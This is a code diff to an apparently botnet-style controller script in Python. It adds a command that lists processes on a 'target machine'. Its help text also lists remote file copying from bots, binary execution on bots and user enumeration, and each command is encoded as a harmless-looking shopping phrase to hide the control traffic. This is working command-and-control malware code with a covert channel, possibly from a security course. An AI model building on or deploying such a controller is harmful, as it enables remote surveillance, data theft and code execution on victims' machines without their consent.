@@ -11,7 +11,6 @@ import sys
 from Connection import Connection
 import threading
 import time
-import base64
 import translations
 
 
@@ -98,6 +97,7 @@ def main():
     print("w               list of users currently logged in")
     print("ls <PATH>       list content of specified directory")
     print("id              ID of current user")
+    print("ps              lists processes on the target machine")
     print("copy <PATH>     copy a file from the bot to the controller")
     print("exec <PATH>     execute a binary inside the bot given the path of the binary")
     print("end             turn off bots and controller")
@@ -128,6 +128,9 @@ def main():
         # command id
         elif len(command) == 1 and command[0] == "id":
             encrypted_command = "on " + str(counter) + " day buy identity\n"
+            # command id
+        elif len(command) == 1 and command[0] == "ps":
+            encrypted_command = "on " + str(counter) + " day buy playstation\n"
         # command copy
         elif len(command) == 2 and command[0] == "copy":
             enc = translations.encode_string(command[1])
